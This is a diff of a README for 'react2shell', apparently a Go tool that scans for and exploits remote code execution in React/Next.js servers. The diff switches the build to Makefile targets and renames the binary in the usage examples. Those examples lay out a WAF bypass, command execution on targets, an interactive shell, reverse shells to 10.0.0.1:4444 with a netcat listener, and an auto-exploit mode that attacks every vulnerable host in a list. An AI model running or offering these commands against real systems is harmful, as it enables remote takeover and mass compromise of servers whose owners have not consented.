@@ -29,11 +29,27 @@
 ## Installation
 
 ```bash
-# Clone and build
+# Clone the repository
 git clone https://github.com/beecynical637/react2shell_go.git
+cd react2shell_go
+
+# Install dependencies
 go mod tidy
-go build -o react2shell ./cmd/react2shell
+
+# Build for all platforms
+make build
+
+# Or build for a specific platform, e.g., for macOS Apple Silicon
+make build-macos-arm64
 ```
+
+## Makefile Targets
+
+- `make build`: Build binaries for all supported platforms (Linux AMD64, macOS Intel, macOS Apple Silicon, Windows AMD64)
+- `make build-linux-amd64`: Build for Linux AMD64
+- `make build-macos-amd64`: Build for macOS Intel
+- `make build-macos-arm64`: Build for macOS Apple Silicon
+- `make clean`: Remove all built binaries from the bin/ directory
 
 ## Usage
 
@@ -41,49 +57,49 @@ go build -o react2shell ./cmd/react2shell
 
 ```bash
 # Scan single host
-./react2shell -u https://example.com
+./react2shell_macos_apple_silicon -u https://example.com
 
 # Scan multiple hosts from file
-./react2shell -l hosts.txt -t 20 -o results.json
+./react2shell_macos_apple_silicon -l hosts.txt -t 20 -o results.json
 
 # Safe side-channel check (non-destructive)
-./react2shell -u https://example.com --safe-check
+./react2shell_macos_apple_silicon -u https://example.com --safe-check
 
 # With WAF bypass
-./react2shell -u https://example.com --waf-bypass
+./react2shell_macos_apple_silicon -u https://example.com --waf-bypass
 
 # With custom paths
-./react2shell -u https://example.com --path /_next --path /api
+./react2shell_macos_apple_silicon -u https://example.com --path /_next --path /api
 
 # With custom headers
-./react2shell -u https://example.com -H "Authorization: Bearer token"
+./react2shell_macos_apple_silicon -u https://example.com -H "Authorization: Bearer token"
 ```
 
 ### Exploit Mode
 
 ```bash
 # Execute single command
-./react2shell -u https://vulnerable.com --exploit -c "id"
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit -c "id"
 
 # Interactive shell
-./react2shell -u https://vulnerable.com --exploit --shell
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit --shell
 
 # Windows target
-./react2shell -u https://vulnerable.com --exploit -c "whoami" --windows
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit -c "whoami" --windows
 
 # Get system information
-./react2shell -u https://vulnerable.com --exploit --sysinfo
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit --sysinfo
 
 # Reverse shell (start listener first: nc -lvnp 4444)
-./react2shell -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444
-./react2shell -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444 --revshell-type python
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444
+./react2shell_macos_apple_silicon -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444 --revshell-type python
 ```
 
 ### Auto-Exploit Mode
 
 ```bash
 # Scan multiple hosts and exploit all vulnerable ones
-./react2shell -l hosts.txt --auto-exploit -c "id"
+./react2shell_macos_apple_silicon -l hosts.txt --auto-exploit -c "id"
 ```
 
 ### Interactive Shell Commands
